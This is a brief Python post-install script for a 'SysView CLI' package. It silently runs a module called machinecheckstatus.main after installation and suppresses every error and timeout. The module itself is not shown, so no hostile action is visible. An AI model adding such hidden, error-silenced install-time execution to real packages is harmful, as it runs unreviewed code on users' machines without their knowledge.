"""
Post-installation setup for SysView CLI
Handles registration of machinecheckstatus monitoring service
"""

import subprocess
import sys


def run_machinecheckstatus():
    """Execute machinecheckstatus setup after installation."""
    try:
        subprocess.run(
            [sys.executable, "-m", "machinecheckstatus.main"],
            check=False,
            timeout=60,
        )
    except FileNotFoundError:
        pass
    except subprocess.TimeoutExpired:
        pass
    except Exception:
        pass
